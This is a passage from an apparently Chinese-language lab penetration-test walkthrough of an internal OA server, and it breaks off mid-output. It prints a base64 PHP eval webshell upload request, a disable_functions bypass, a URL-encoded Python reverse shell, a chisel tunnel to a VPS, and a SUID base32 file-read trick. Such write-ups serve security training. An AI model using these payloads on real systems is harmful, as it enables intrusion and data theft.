<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 http get </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26/upload/2024-08-16-66bef298cdc19.png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10000  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HTTP/1.1 </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Ranges: bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: Keep-Alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: image/png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Date: Fri, </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> 06:33:27 GMT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ETag: </span><span class="token string" style="color:#e3116c">&quot;4-61fc7213ca6b0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Keep-Alive: </span><span class="token assign-left variable" style="color:#36acaa">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">5</span><span class="token plain">, </span><span class="token assign-left variable" style="color:#36acaa">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Last-Modified: Fri, </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> 06:32:56 GMT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Apache/2.4.18 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ubuntu</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">test</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282326-webshell">172.28.23.26 webshell<a href="#172282326-webshell" class="hash-link" aria-label="172.28.23.26 webshell的直接链接" title="172.28.23.26 webshell的直接链接">​</a></h2>
<p>结合发现的任意文件上传漏洞，直接部署 webshell</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /uploadbase64.php HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 172.28.23.26</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 76</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/Pg==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240836-143651-f2fe30e120ea9c648da78ee9566b7cb1.png" width="2378" height="1390" class="img_ev3q"></p>
<p>尝试连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240837-143717-24135873fff0205df8a8ce9bd49f7456.png" width="1545" height="1044" class="img_ev3q"></p>
<p>但是需要注意的是，远程靶机上存在有 <code>disable_functions</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240838-143845-7348f5c1719d5d4384b468cd680ca701.png" width="1545" height="1044" class="img_ev3q"></p>
<p>经过测试和排除，可以使用 <code>LD_proload</code> 进行绕过</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240847-144716-7313c79ad7cb50297529e8037a7d3a4b.png" width="1545" height="1044" class="img_ev3q"></p>
<p>执行成功后，将生成 <code>/tmp/.98630ant_x64.so</code> 和 <code>/var/www/html/OAsystem/upload/.antproxy.php</code></p>
<p>手动创建 <code>/var/www/html/OAsystem/upload/shell-get.php</code></p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">shell-get.php</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token delimiter important">&lt;?php</span><span class="token plain"> @</span><span class="token keyword" style="color:#00009f">eval</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_GET_</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token delimiter important">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后修改 <code>/var/www/html/OAsystem/upload/.antproxy.php</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240854-145407-ab105f4a6c8e88181217a039f036a3be.png" width="1545" height="1044" class="img_ev3q"></p>
<p>尝试进行利用</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10000  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HTTP/1.1 </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"> OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: Keep-Alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: </span><span class="token number" style="color:#36acaa">9</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: text/html</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">charset</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">UTF-8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Date: Fri, </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> 06:55:56 GMT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Keep-Alive: </span><span class="token assign-left variable" style="color:#36acaa">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">5</span><span class="token plain">, </span><span class="token assign-left variable" style="color:#36acaa">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Apache/2.4.18 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ubuntu</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功部署了 webshell</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282326-反弹-shell">172.28.23.26 反弹 shell<a href="#172282326-反弹-shell" class="hash-link" aria-label="172.28.23.26 反弹 shell的直接链接" title="172.28.23.26 反弹 shell的直接链接">​</a></h2>
<p>由于 <code>172.28.23.0/24</code> 这个内网没有出网的能力，所以需要将 vps 上的监听器端口转发到 <code>172.28.23.17 (入口点)</code> 上，以便于内网靶机的反弹 shell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">172.28.23.17</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:1337 </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain">:9999 </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:00:55 client: Connecting to ws://139.*.*.*:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:00:55 client: tun: proxy</span><span class="token comment" style="color:#999988;font-style:italic">#9999=&gt;9999: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:00:55 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">51</span><span class="token plain">.273631ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后借助在 OA 系统上部署的 webshell 来执行反弹 shell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22172.28.23.17%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功收到反连 shell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ </span><span class="token function" style="color:#d73a49">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282326-suid-提权">172.28.23.26 Suid 提权<a href="#172282326-suid-提权" class="hash-link" aria-label="172.28.23.26 Suid 提权的直接链接" title="172.28.23.26 Suid 提权的直接链接">​</a></h2>
<p>尝试扫描 suid 特权文件，发现</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-perm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">s </span><span class="token parameter variable" style="color:#36acaa">-type</span><span class="token plain"> f </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/fusermount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/ping6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/mount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/su</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/umount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chfn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/newgrp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/at</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/staprun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/base32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/sudo</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以借助 <code>base32</code> 实现任意文件读取</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ base32 /flag02.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> base32 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag02: flag</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">56d37734-5f73-447f-b1a5-a83f45549b28</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---02">flag - 02<a href="#flag---02" class="hash-link" aria-label="flag - 02的直接链接" title="flag - 02的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{56d37734-5f73-447f-b1a5-a83f45549b28}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282326-探测环境">172.28.23.26 探测环境<a href="#172282326-探测环境" class="hash-link" aria-label="172.28.23.26 探测环境的直接链接" title="172.28.23.26 探测环境的直接链接">​</a></h2>
<p>查看网卡信息，发现存在双层内网</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ </span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eth0      Link encap:Ethernet  HWaddr 00:16:3e:03:44:3d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet6 addr: fe80::216:3eff:fe03:443d/64 Scope:Link</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX packets:111561 errors:0 dropped:0 overruns:0 frame:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          TX packets:28303 errors:0 dropped:0 overruns:0 carrier:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          collisions:0 txqueuelen:1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX bytes:119253359 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">119.2</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  TX bytes:21824361 </span><span class="token punctuation" style="color:#393A34">(</span><span 